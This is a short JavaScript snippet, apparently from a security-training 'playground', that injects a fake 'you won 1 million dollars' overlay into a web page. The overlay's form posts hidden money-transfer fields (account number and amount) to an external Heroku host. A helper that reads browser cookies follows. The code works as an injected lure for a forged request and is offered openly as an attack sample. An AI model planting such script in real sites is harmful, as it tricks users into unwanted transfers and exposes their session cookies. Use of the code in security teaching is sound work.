

const html = "<div class=\"bg-white border p-3\" style=\"position: fixed; top: 40%; left:30%; z-index: 100\">" +
    "<h3>Congratulations. You just won a bonus of 1 million dollars!!!</h3>" +
    "<form action=\"https://security-playground-fake-cdn-495328354550.herokuapp.com/prize\" method=\"post\">" +
    "<input type=\"hidden\" name=\"TransferAccount\" value=\"9876865434\" />" +
    "<input type=\"hidden\" name=\"Amount\" value=\"1000\" />" +
    "<input type=\"submit\" value=\"Click here to claim your bonus\"/>" +
    "</form>" + 
    "</div>";

const childs = new DOMParser().parseFromString(html, 'text/html').body.children;

console.log(childs)

for (const child of [...childs]) {
    document.body.appendChild(child);
}

function getCookie(cookiename) {
    var cookiestring = RegExp(cookiename + "=[^;]+").exec(document.cookie);

    return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : "");
}
